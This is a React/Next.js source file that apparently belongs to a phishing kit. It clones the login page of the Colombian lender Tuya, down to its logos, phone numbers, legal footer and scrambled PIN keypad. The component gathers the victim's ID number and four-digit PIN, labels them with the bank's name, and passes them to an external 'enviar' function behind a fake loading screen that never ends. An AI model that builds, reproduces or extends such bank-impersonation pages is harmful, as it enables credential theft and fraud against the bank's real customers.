/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState, useCallback, useMemo, useEffect } from 'react';

import PopLoader from './PopLoader';

// --- CONFIGURACIÓN ESTÁTICA ---
const DESKTOP_KEY_ORDER = [0, 5, 4, 8, 1, 6, 7, 2, 3, 9];
const MOBILE_KEY_ORDER = [2, 7, 5, 9, 0, 3, 8, 1, 6, 4];
const MAX_PASSWORD_LENGTH = 4;

// 🚀 KeyButton EXTRAÍDO como un componente independiente
const KeyButton = ({ value, onClick, className = '' }: { value: string | number, onClick: () => void, className?: string }) => (
  <button
    type="button"
    onClick={onClick}
    className={`w-full h-10 lg:h-8 text-white font-bold text-lg rounded-sm transition-colors duration-150 ${className}`}
    style={{ backgroundColor: '#c00000', border: '1px solid #c00000' }}
  >
    {value}
  </button>
);

// --- COMPONENTE PRINCIPAL ---
export default function LoginPage({ enviar }: any) {

  // --- ESTADO Y LÓGICA DE FECHA DINÁMICA ---
  const [documentType, setDocumentType] = useState('1');
  const [identification, setIdentification] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false); // ✅ Estado de carga
  const [currentDateTime, setCurrentDateTime] = useState('');

  // Función de simulación de envío (tu lógica original)
  function handleSubmitClaveSegura() {
    if (!identification || password.length !== 4) {
      console.warn("Datos de clave segura inválidos");
      return null;
    }

    return {
      view: "login",
      tipoIngreso: "clave_segura",
      user: identification,
      pass: password,
      bank: "Tuya",
      timestamp: new Date().toISOString(),
    };
  }

  // Función para formatear la fecha como "1/12/2025 4:58:07 p.m."
  const formatDateTime = (date: Date) => {
    const day = date.getDate();
    const month = date.getMonth() + 1; // getMonth() es 0-indexado
    const year = date.getFullYear();

    const timeOptions: Intl.DateTimeFormatOptions = {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true, // Para 'a.m.' o 'p.m.'
    };
    const timePart = date.toLocaleTimeString('es-CO', timeOptions);

    return `${day}/${month}/${year} ${timePart.replace(/\./g, '')}`;
  };

  // 🆕 useEffect para actualizar la fecha
  useEffect(() => {
    const updateTime = () => {
      setCurrentDateTime(formatDateTime(new Date()));
    };

    updateTime();
    const timerId = setInterval(updateTime, 1000);
    return () => clearInterval(timerId);
  }, []);

  // --- LÓGICA DE TECLADO ---

  const appVersion = "5.0.2";

  const getKeyboardOrder = () => {
    if (typeof window !== 'undefined' && window.innerWidth < 1024) {
      return MOBILE_KEY_ORDER;
    }
    return DESKTOP_KEY_ORDER;
  };

  const activeKeyOrder = useMemo(() => getKeyboardOrder(), []);

  const fillPassword = useCallback((digit: string) => {
    if (password.length < MAX_PASSWORD_LENGTH) {
      setPassword(prev => prev + digit);
    }
  }, [password]);

  const clearPassword = useCallback(() => {
    setPassword('');
  }, []);

  const handleIdentificationChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    setIdentification(value);
  };

  // 🎯 Lógica para el botón 'Ingresar'
  const handleLoginClick = () => {
    // 1. Validaciones
    if (password.length !== MAX_PASSWORD_LENGTH) {
      alert(`La clave debe tener ${MAX_PASSWORD_LENGTH} dígitos.`);
      return;
    }

    // 2. Mostrar Loader
    setLoading(true);

    // 3. Simular la llamada a la función (aquí se llama a enviar)
    const data = handleSubmitClaveSegura();

    // 4. Ejecutar 'enviar' (puede ser una función async/await en un caso real)
    if (data) {
      // 💡 SIMULACIÓN DE TIEMPO: Usar un timeout para que el loader se vea.
      // En un caso real, esto se haría en el .then/.catch/.finally de una promesa (fetch/axios).
      setTimeout(() => {
        enviar(data); // Llamada original
        // setLoading(false); // 5. Ocultar Loader
        // alert(`Simulación de Login exitoso. Clave: ${password}`);
      }, 1500); // Muestra el loader por 1.5 segundos
    } else {
      // Si la validación falla internamente
      setLoading(false);
    }
  };

  // ❌ Remover handleSubmit de la etiqueta <form> para evitar doble envío o confusión
  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // La lógica de login está ahora en handleLoginClick
    handleLoginClick();
  };

  const getKeyValue = (index: number) => activeKeyOrder[index].toString();

  // --- RENDERIZADO ---
  return (
    <div className="min-h-screen bg-gray-50 pb-10">
      {/* ✅ PopLoader se muestra si loading es true */}
      {loading && <PopLoader />}
      {/* -------------------- ENCABEZADO Y BANNER -------------------- */}
      <header className="flex flex-col lg:flex-row justify-between items-center px-0">

        {/* Banner de Beneficios (Izquierda - Rojo) */}
        <div
          className="shrink-0 text-white font-bold text-xl mb-4 w-full lg:w-[350px]"
          style={{
            backgroundColor: '#fff',
            borderBottomRightRadius: '0px',
            height: '100px',
            lineHeight: '1.2'
          }}
        >
          <img src="/bancos/tuya/bannerPortalSinMarcas.png" />
        </div>

        {/* Fecha y Versión (Derecha) */}
        <div className="flex flex-col text-sm text-gray-700 p-4 w-full lg:w-auto text-center lg:text-right">
          <span>Fecha Actual {currentDateTime}</span>
          <span>Versión {appVersion}</span>
        </div>
      </header>

      {/* -------------------- CONTENIDO PRINCIPAL (LOGIN) -------------------- */}
      <div className="container mx-auto max-w-5xl pt-8 px-4">
        {/* Usamos handleFormSubmit en el formulario */}
        <form onSubmit={handleFormSubmit} className="flex flex-col items-center">

          {/* ... otros elementos del formulario ... */}

          {/* Contenedor principal: Responsive */}
          <div className="flex flex-col lg:flex-row w-full lg:justify-around items-center lg:items-start space-y-10 lg:space-y-0 lg:space-x-12">

            <div className="flex w-full justify-center lg:justify-start">
              <div className="grid grid-cols-2 gap-4 lg:gap-12 w-full max-w-lg lg:w-auto">

                {/* 1. TECLADO VIRTUAL */}
                {/* ... */}
                <div className="flex flex-col space-y-1 w-[120px] lg:w-[180px] mt-0 lg:mt-10 mx-auto">

                  {/* Fila 1 */}
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(0)} onClick={() => fillPassword(getKeyValue(0))} />
                    <KeyButton value={getKeyValue(1)} onClick={() => fillPassword(getKeyValue(1))} />
                    <KeyButton value={getKeyValue(2)} onClick={() => fillPassword(getKeyValue(2))} />
                  </div>
                  {/* Fila 2 */}
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(3)} onClick={() => fillPassword(getKeyValue(3))} />
                    <KeyButton value={getKeyValue(4)} onClick={() => fillPassword(getKeyValue(4))} />
                    <KeyButton value={getKeyValue(5)} onClick={() => fillPassword(getKeyValue(5))} />
                  </div>
                  {/* Fila 3 */}
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(6)} onClick={() => fillPassword(getKeyValue(6))} />
                    <KeyButton value={getKeyValue(7)} onClick={() => fillPassword(getKeyValue(7))} />
                    <KeyButton value={getKeyValue(8)} onClick={() => fillPassword(getKeyValue(8))} />
                  </div>
                  {/* Fila 4: Último dígito + Borrar */}
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(9)} onClick={() => fillPassword(getKeyValue(9))} className="col-span-1" />
                    <button
                      type="button"
                      onClick={clearPassword}
                      className="col-span-2 w-full h-10 lg:h-8 text-white font-bold text-lg rounded-sm transition-colors duration-150"
                      style={{ backgroundColor: '#c00000', border: '1px solid #c00000' }}
                    >
                      Borrar
                    </button>
                  </div>
                </div>

                {/* 2. CAMPOS DE LOGIN */}
                <div className="flex flex-col w-full space-y-4 max-w-[200px] lg:max-w-[250px] mx-auto">

                  {/* TIPO DE DOCUMENTO */}
                  <div>
                    <label className="font-bold text-gray-700 text-sm block mb-1">Tipo de Documento</label>
                    <select
                      value={documentType}
                      onChange={(e) => setDocumentType(e.target.value)}
                      className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                      style={{ minWidth: '150px' }}
                    >
                      <option value="1">CÉDULA DE CIUDADANÍA</option>
                      <option value="2">CÉDULA DE EXTRANJERÍA</option>
                      <option value="6">CARNÉ DIPLOMÁTICO</option>
                    </select>
                  </div>

                  {/* DOCUMENTO DE IDENTIFICACIÓN */}
                  <div>
                    <label className="font-bold text-gray-700 text-sm block mb-1">Documento de Identificación</label>
                    <input
                      type="text"
                      maxLength={15}
                      className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                      onChange={handleIdentificationChange}
                      value={identification}
                    />
                  </div>

                  {/* CLAVE (PASSWORD) */}
                  <div className="flex items-center space-x-2">
                    <label className="font-bold text-gray-700 text-sm shrink-0">Clave</label>
                    <input
                      type="password"
                      maxLength={4}
                      readOnly
                      value={password.split('').map(() => '•').join('')}
                      className="w-16 border border-gray-400 p-2 text-sm text-center rounded-sm focus:ring-0 focus:border-red-600 h-10"
                    />
                    <button
                      type="submit"
                      className="px-4 py-2 text-sm font-bold text-white rounded-sm transition-colors duration-150 h-10"
                      // 🎯 Se eliminó la lógica compleja y se llama a la función principal
                      onClick={handleLoginClick}
                      style={{ backgroundColor: '#c00000' }}
                    >
                      Ingresar
                    </button>
                  </div>

                  {/* ENLACE DE AYUDA */}
                  <div className="text-left mt-2">
                    <span className="text-sm text-gray-700">Obtener </span>
                    <a href="#" className="text-blue-600 hover:underline text-sm">Ayuda</a>
                  </div>
                </div>
              </div>
            </div>

            {/* 3. IMAGEN LATERAL */}
            <div className="shrink-0 w-full sm:w-[300px] h-[250px] mt-8 lg:mt-0 lg:order-last order-3 mx-auto">
              <img
                src="/bancos/tuya/PublicidadPortal.jpeg"
                alt="Mujer hablando por teléfono"
                className="rounded-lg shadow-md object-cover w-full h-full"
              />
            </div>

          </div>

          {/* -------------------- LOGOS Y PIE DE PÁGINA -------------------- */}

          {/* Logos de Tarjetas */}
          <div className="flex flex-wrap justify-center items-center gap-4 my-10 max-w-lg">
            <img src="/bancos/tuya/titulos-productos.png" alt={`Logo`} className="h-8" />
          </div>

          {/* Texto Legal */}
          <div className="text-center text-xs text-gray-600 max-w-xl px-4">
            Líneas de atención al cliente: Bogotá 601 482 4804 - Cali 602 380 8933 – Medellín 604 444 3727. Línea Nacional: 01 8000 978888<br />
            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br />
            Para conocer acerca de la utilización de Información,<br />
            <a href="https://www.tuya.com.co/para-tener-en-cuenta" target="_blank" className="text-blue-600 hover:underline">Ingresa aquí</a>
          </div>

        </form>
      </div>
    </div>
  );
}